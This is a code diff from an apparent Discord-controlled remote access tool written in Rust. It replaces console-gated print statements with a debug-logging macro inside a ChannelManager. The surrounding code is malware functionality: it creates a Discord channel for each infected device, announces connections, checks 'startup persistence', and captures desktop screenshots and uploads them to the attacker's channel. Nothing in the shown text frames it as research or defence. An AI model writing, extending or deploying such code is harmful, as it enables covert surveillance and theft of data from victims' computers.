@@ -2,6 +2,7 @@ use crate::config::Config;
 use crate::core::device_id::DeviceId;
 use crate::core::screenshot::Screenshot;
 use crate::system_info::{DeviceInfo, SystemInfo};
+use crate::log_debug;
 use anyhow::Result;
 use twilight_http::Client;
 use twilight_model::channel::ChannelType;
@@ -22,24 +23,18 @@ impl ChannelManager {
 
     pub async fn init_dchannel(&self) -> Result<Id<ChannelMarker>> {
         let device_name = DeviceId::get_device_channel_name()?;
-        if Config::SHOW_CONSOLE {
-            println!("Looking for device channel: {}", device_name);
-        }
+        log_debug!("Looking for device channel: {}", device_name);
 
         if let Some(channel_id) = self.find_cbn(&device_name).await? {
-            if Config::SHOW_CONSOLE {
-                println!(
-                    "Found existing channel: {} (ID: {})",
-                    device_name, channel_id
-                );
-            }
+            log_debug!(
+                "Found existing channel: {} (ID: {})",
+                device_name, channel_id
+            );
             self.announce_device(channel_id).await?;
             return Ok(channel_id);
         }
 
-        if Config::SHOW_CONSOLE {
-            println!("Channel not found, creating new channel: {}", device_name);
-        }
+        log_debug!("Channel not found, creating new channel: {}", device_name);
         let channel_id = self.create_dchannel(&device_name).await?;
 
         self.announce_dconnect(channel_id).await?;
@@ -74,9 +69,7 @@ impl ChannelManager {
             .await?;
         let channel = response.model().await?;
 
-        if Config::SHOW_CONSOLE {
-            println!("Created new channel: {} (ID: {})", channel_name, channel.id);
-        }
+        log_debug!("Created new channel: {} (ID: {})", channel_name, channel.id);
         Ok(channel.id)
     }
 
@@ -91,20 +84,16 @@ impl ChannelManager {
             .await?;
 
         if let Err(e) = crate::core::startup::check_startup().await {
-            if Config::SHOW_CONSOLE {
-                println!("Failed to ensure startup persistence: {}", e);
-            }
+            log_debug!("Failed to ensure startup persistence: {}", e);
         }
 
         match Screenshot::capture_as_bytes() {
             Ok((screenshot_data, filename)) => {
-                if Config::SHOW_CONSOLE {
-                    println!(
-                        "Captured reconnection screenshot: {} ({} bytes)",
-                        filename,
-                        screenshot_data.len()
-                    );
-                }
+                log_debug!(
+                    "Captured reconnection screenshot: {} ({} bytes)",
+                    filename,
+                    screenshot_data.len()
+                );
 
                 // Send screenshot as attachment using Twilight API
                 use twilight_model::http::attachment::Attachment;
@@ -117,14 +106,10 @@ impl ChannelManager {
                     .attachments(&[attachment])
                     .await?;
 
-                if Config::SHOW_CONSOLE {
-                    println!("Reconnection screenshot sent successfully");
-                }
+                log_debug!("Reconnection screenshot sent successfully");
             }
             Err(e) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Failed to capture reconnection screenshot: {}", e);
-                }
+                log_debug!("Failed to capture reconnection screenshot: {}", e);
                 // Send a message about screenshot failure
                 self.http
                     .create_message(channel_id)
@@ -148,13 +133,11 @@ impl ChannelManager {
 
         match Screenshot::capture_as_bytes() {
             Ok((screenshot_data, filename)) => {
-                if Config::SHOW_CONSOLE {
-                    println!(
-                        "Captured screenshot: {} ({} bytes)",
-                        filename,
-                        screenshot_data.len()
-                    );
-                }
+                log_debug!(
+                    "Captured screenshot: {} ({} bytes)",
+                    filename,
+                    screenshot_data.len()
+                );
 
                 use twilight_model::http::attachment::Attachment;
                 let attachment = Attachment::from_bytes(filename, screenshot_data, 1);
@@ -164,14 +147,10 @@ impl ChannelManager {
                     .content("**Desktop Screenshot**")
                     .attachments(&[attachment])
                     .await?;
-                if Config::SHOW_CONSOLE {
-                    println!("Screenshot sent successfully");
-                }
+                log_debug!("Screenshot sent successfully");
             }
             Err(e) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Failed to capture screenshot: {}", e);
-                }
+                log_debug!("Failed to capture screenshot: {}", e);
                 // Send a message about screenshot failure
                 self.http
                     .create_message(channel_id)
